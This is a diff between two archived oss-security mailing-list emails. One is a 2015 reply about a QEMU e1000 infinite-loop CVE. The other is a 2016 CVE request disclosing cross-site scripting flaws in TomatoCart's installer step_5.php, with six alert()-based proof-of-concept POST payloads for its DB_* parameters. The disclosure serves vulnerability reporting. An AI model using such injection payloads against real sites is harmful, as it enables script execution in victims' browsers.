@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["774" "Monday" "7" "September" "2015" "13:09:43" "+0800" "Qinghao Tang" "luodalongde@gmail.com" "<CAPcZBq53SBAm+u76gFpD_wGuOohWtsMO+eAskx9Yoo_LQoB8PA@mail.gmail.com>" "28" "Re: [oss-security] Re: CVE Request Qemu: net: e1000 infinite loop issue" nil nil nil "9" "2015090705:09:43" "[oss-security] Re: CVE Request Qemu: net: e1000 infinite loop issue" (number mark "U       luodalongde@ Sep  7   28/774   " thread-indent "\"Re: [oss-security] Re: CVE Request Qemu: net: e1000 infinite loop issue\"\n") "<55ED19F1.2020901@redhat.com>" ("<alpine.LFD.2.20.1509050128380.647@wniryva>" "<20150905161154.82E526C009F@smtpvmsrv1.mitre.org>" "<CAPcZBq4gzYosDo4EUGeP9s_+Ngu07Ke=5n+5PVdkUQBHYSGBYg@mail.gmail.com>" "<55ED19F1.2020901@redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1725" "Thursday" "24" "November" "2016" "15:25:10" "+0800" "haojun hou" "haojunhou@gmail.com" "<60EBD88B-40E8-47F9-B959-F8500C994D59@gmail.com>" "73" "[oss-security] CVE request - TomatoCart 1.1.8.6.1 Multiple Cross-Site Scripting (XSS)" nil nil nil "11" "2016112407:25:10" "[oss-security] CVE request - TomatoCart 1.1.8.6.1 Multiple Cross-Site Scripting (XSS)" (number mark "U       haojunhou@gm Nov 24   73/1725  " thread-indent "\"[oss-security] CVE request - TomatoCart 1.1.8.6.1 Multiple Cross-Site Scripting (XSS)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 18190 invoked by uid 550); 7 Sep 2015 08:34:29 -0000
+Received: (qmail 21535 invoked by uid 550); 24 Nov 2016 10:44:06 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,59 +12,111 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 3209 invoked from network); 7 Sep 2015 05:09:54 -0000
+Received: (qmail 13901 invoked from network); 24 Nov 2016 07:25:27 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=gmail.com; s=20120113;
-        h=mime-version:in-reply-to:references:date:message-id:subject:from:to
-         :cc:content-type;
-        bh=f34xw7rBDWQhc8B4YGCytJmomPxM9/RHnxWoXm/mFng=;
-        b=voVks5/b0JfVW9WK6QjjxvtJATFNn1NHTe6MoYNZTFUNC5CW9d1NpN8qixF3u0PQ+8
-         A4iDYl36TqOqLoBi/gsOeGL1WYzzADYCufMPlm4OcWWQjQmm5Gwa96RNMKrIEQF6QbkD
-         1QJxnA1NVWd1c0hYDEtlwKDkml4Y0+LFpBdbSH2D4jMe/NXgEa+xBJWUqlREgLg2FLlf
-         aeUgSDtklfGfTdMB0/lx8bCEeSirA8bQYaVdUExOk2wU15XVwWKUk8jMvMZ/2shyOy8E
-         V2V3kU2bCrYeLkQdOjc4g5hQn3O3/muyl1OhiqCysaDNiPW9paTnwZcwpNPGxEXk0VrQ
-         tIbQ==
-MIME-Version: 1.0
-X-Received: by 10.194.109.228 with SMTP id hv4mr30474799wjb.110.1441602583492;
- Sun, 06 Sep 2015 22:09:43 -0700 (PDT)
-In-Reply-To: <55ED19F1.2020901@redhat.com>
-References: <alpine.LFD.2.20.1509050128380.647@wniryva>
-	<20150905161154.82E526C009F@smtpvmsrv1.mitre.org>
-	<CAPcZBq4gzYosDo4EUGeP9s_+Ngu07Ke=5n+5PVdkUQBHYSGBYg@mail.gmail.com>
-	<55ED19F1.2020901@redhat.com>
-Date: Mon, 7 Sep 2015 13:09:43 +0800
-Message-ID: <CAPcZBq53SBAm+u76gFpD_wGuOohWtsMO+eAskx9Yoo_LQoB8PA@mail.gmail.com>
-From: Qinghao Tang <luodalongde@gmail.com>
-To: Huzaifa Sidhpurwala <huzaifas@redhat.com>
-Cc: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary=089e010d8648e57c65051f214187
-Subject: Re: [oss-security] Re: CVE Request Qemu: net: e1000 infinite loop issue
+        h=from:mime-version:subject:message-id:date:to;
+        bh=tufEFEe7VkDvgvgOwr8N5ViT0kT58jf009XZA87h7Zs=;
+        b=imYgZOalhoPLqZ2HSkKpo7R+t+tgVqHmHA8JvsEAa5zEHkJUb8ZIafslyl68gTcXSC
+         3E1ODxNXJWqVp7uGO7A70aHxTJudWnlwrwVpXsp7Xvb8Im7+PUbsCDSYZwnafm3X1w4t
+         ZXKJqIyxNx6Fm8RTmU1BRu5VDM9AP7x84sRI7QJO9F4ZLk1Xk2CrYAAr32QefAeUCqu+
+         JuJtvgLcznv2DfU6oMK3CQxo/vw7hDa35NfvbIdFOMh12QaQF8tfGJhn5AkgdJMdlSLP
+         iL/sYHqS/SNH/favlEzy6OpIP79RaITI2fm6NK9UiVls+HaR+sWoapOJXo4LNknal9fk
+         whFw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:from:mime-version:subject:message-id:date:to;
+        bh=tufEFEe7VkDvgvgOwr8N5ViT0kT58jf009XZA87h7Zs=;
+        b=NcZAYbKyVGCHRIf8/BZLLO147BbjEfWf5buo1eqir14BfsunklaTFbnbOrwz/lzj2Q
+         EyLToZXHHSxSZQ92YKpV1kwQlCVwH86bnbu2+rDpE2OMkO+0YpZCzT3jFdEWXS5Bty9Z
+         0IuluCpoPyv56oi9WvqeYh4j8JBKkzvMigIJkMqTmAuMmTJz61pZMoMY8pNQqEaUOGgr
+         LCFDmb2ymhY4lo1mdQCuDlEmdj3aEesPbdEkT8BtSj8xwRSyK62t1F39RTMYfWyIP0nc
+         m0PmDUi7luze5z2kAI8bpsNgFIohTmCW0SjVmDCNGqZ5G5WpGwJcQE+lkvTbyQFVyh+A
+         wuvQ==
+X-Gm-Message-State: AKaTC00mhKi8WJCeLWmjG5JNujiUhC7VbMeqBl/+sKy8CuAx39ISrbHin9IOJpQynvp1kg==
+X-Received: by 10.99.127.72 with SMTP id p8mr1713494pgn.183.1479972315539;
+        Wed, 23 Nov 2016 23:25:15 -0800 (PST)
+From: haojun hou <haojunhou@gmail.com>
+Content-Type: multipart/alternative;
+ boundary="Apple-Mail=_EB8402F7-78C3-4958-8D3A-D1E4C8EAA516"
+Mime-Version: 1.0 (Mac OS X Mail 10.1 \(3251\))
+Message-Id: <60EBD88B-40E8-47F9-B959-F8500C994D59@gmail.com>
+Date: Thu, 24 Nov 2016 15:25:10 +0800
+To: oss-security@lists.openwall.com
+X-Mailer: Apple Mail (2.3251)
+Subject: [oss-security] CVE request - TomatoCart 1.1.8.6.1 Multiple Cross-Site Scripting
+ (XSS)
 
---089e010d8648e57c65051f214187
-Content-Type: text/plain; charset=UTF-8
+--Apple-Mail=_EB8402F7-78C3-4958-8D3A-D1E4C8EAA516
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain;
+	charset=gb2312
 
-can you add the vulnerability information at
-https://access.redhat.com/security/cve/CVE-2015-6815 ?
+Hi:
+TomatoCart 1.1.8.6.1 - Multiple Cross-Site Scripting (XSS)=20
 
-2015-09-07 13:00 GMT+08:00 Huzaifa Sidhpurwala <huzaifas@redhat.com>:
+Procuct: TomatoCart
 
-> On 09/06/2015 07:56 AM, Qinghao Tang wrote:
-> > Can you disclosure this
-> > vulneralbility officially claiming that me of the discoverer since it
-> > will influence my KPI? Thanks.
-> > ( Qinghao Tang(tangqinghao@360.cn) from QIHU 360  company )
-> >
->
-> Not sure what you mean by "disclose officially", but this issue is now
-> public and we have acknowledged you at:
->
-> https://bugzilla.redhat.com/show_bug.cgi?id=1260076#c3
->
->
->
->
-> --
-> Huzaifa Sidhpurwala / Red Hat Product Security Team
->
+Vendor: TomatoCart http://www.tomatocart.com
 
---089e010d8648e57c65051f214187--
+Vunlerable Version: 1.1.8.6.1 and probably prior
+
+Tested Version: 1.1.8.6.1
+
+Author: Haojun Hou in ADLab of Venustech
+
+=20
+
+Advisory Details:
+
+Haojun Hou in ADLab of Venustech discovered Multiple Cross-Site Scripting (=
+XSS) in TomatoCart 1.1.8.6.1, which can be exploited to add,modify or delet=
+e information in application`s database and gain complete control over the =
+application.
+
+=20
+
+The vulnerability exists due to insufficientfiltration of user-supplied dat=
+a in multiple HTTP POST parameters passed to =A1=B0TomatoCart-v1-released-v=
+1.1.8.6.1/install/templates/pages/step_5.php=A1=B1 url. An attacker could e=
+xecute arbitrary HTML and script code in browser in context of the vulnerab=
+le website.
+
+The exploitation examples below uses the "alert()" JavaScript function to s=
+ee a  pop-up messagebox:
+
+(1)POST
+
+DB_DATABASE=3D  <>"?>";</script><script>alert(1);</script><script>"<?php"
+
+(2)POST
+
+DB_SERVER_PASSWORD=3D "?>";</script><script>alert(1);</script><script>"<?ph=
+p"
+
+(3)POST
+
+DB_TABLE_PREFIX=3D "?>";</script><script>alert(1);</script><script>"<?php"
+
+(4)POST
+
+DB_DATABASE_CLASS=3D "?>";</script><script>alert(1);</script><script>"<?php"
+
+(5)POST
+
+DB_SERVER_USERNAME=3D "?>";</script><script>alert(1);</script><script>"<?ph=
+p"
+
+(6)POST
+
+DB_SERVER=3D "?>";</script><script>alert(1);</script><script>"<?php"
+
+=20
+
+Could you please help me assign a CVE for this issue?
+
+
+
+=20=
+
+--Apple-Mail=_EB8402F7-78C3-4958-8D3A-D1E4C8EAA516--
